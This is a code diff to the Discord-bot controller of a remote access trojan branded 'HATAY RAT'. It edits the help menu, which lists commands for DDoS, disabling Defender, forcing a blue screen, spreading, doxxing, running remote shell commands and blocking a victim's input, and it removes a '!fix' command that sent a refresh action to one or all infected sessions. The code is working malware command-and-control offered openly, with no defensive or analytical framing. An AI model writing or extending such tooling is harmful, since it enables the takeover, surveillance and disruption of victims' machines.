@@ -108,7 +108,7 @@ def get_help_embed():
     embed.add_field(name="⚙️ SYSTEM", value="`!ps` `!kill <name>` `!taskmgr_off` `!block_input` `!unblock_input` `!shell <cmd>`", inline=False)
     embed.add_field(name="⚡ ATTACK", value="`!ddos <ip> <port> <sec>` `!defender_off` `!bsod` `!spread <msg>`", inline=False)
     embed.add_field(name="🎭 TROLL", value="`!tts <msg>` `!wall <url>` `!stress <sec>` `!troll <screamer|beep|mouse>`", inline=False)
-    embed.add_field(name="🧹 DANGER", value="`!cleanup` `!shutdown` `!dox` `!fix [all]`", inline=False)
+    embed.add_field(name="🧹 DANGER", value="`!cleanup` `!shutdown` `!dox`", inline=False)
     embed.set_footer(text="HATAY RAT | Ultra Deep Features Enabled")
     return embed
 
@@ -343,22 +343,6 @@ async def unblock_input(ctx):
     if not current_target_id: return await ctx.send("❌ No target.")
     queue_command(current_target_id, "unblock_input")
     await ctx.send(f"🔓 Unblocking input on `{current_target_id}`...")
-
-@bot.command()
-async def fix(ctx, target: str = ""):
-    global sessions, current_target_id
-    if target == "all":
-        count = 0
-        for sid in list(sessions.keys()):
-            queue_command(sid, "fix")
-            count += 1
-        await ctx.send(f"🔄 Refresh command sent to **ALL** clients ({count}).")
-    else:
-        tid = target if target else current_target_id
-        if not tid or tid not in sessions:
-            return await ctx.send("❌ Usage: `!fix <id>` or `!fix all` (or select a target with `!use`) ")
-        queue_command(tid, "fix")
-        await ctx.send(f"🔄 Refresh command sent to `{tid}`.")
 
 @bot.command()
 async def cleanup(ctx):
